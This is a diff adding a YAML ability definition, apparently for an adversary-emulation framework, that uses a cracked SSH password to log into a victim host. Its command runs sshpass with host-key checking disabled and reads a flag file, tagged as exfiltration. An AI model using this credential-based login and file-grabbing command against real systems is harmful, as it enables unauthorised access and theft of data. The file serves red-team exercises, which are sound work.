@@ -1,0 +1,31 @@
+- requirements:
+  - module: plugins.stockpile.app.requirements.paw_provenance
+    relationship_match:
+    - source: victim.ssh.password
+      edge: ''
+      target: ''
+  - module: plugins.stockpile.app.requirements.paw_provenance
+    relationship_match:
+    - source: victim.ssh.user
+      edge: ''
+      target: ''
+  - module: plugins.stockpile.app.requirements.paw_provenance
+    relationship_match:
+    - source: victim.host.ip
+      edge: ''
+      target: ''
+  name: Password Cracking - Get flag
+  description: Get flag file
+  tactic: exfiltration
+  technique_id: T1030
+  technique_name: Data Transfer Size Limits
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: linux
+    name: sh
+    payloads: []
+    parsers: []
+    command: 'sshpass -v -p #{victim.ssh.password} ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no #{victim.ssh.user}@#{victim.host.ip}
+      "cat ~/flag.txt" -v'
+  id: 8035d1e4-0a93-4869-93d3-0c0e2f3d4778
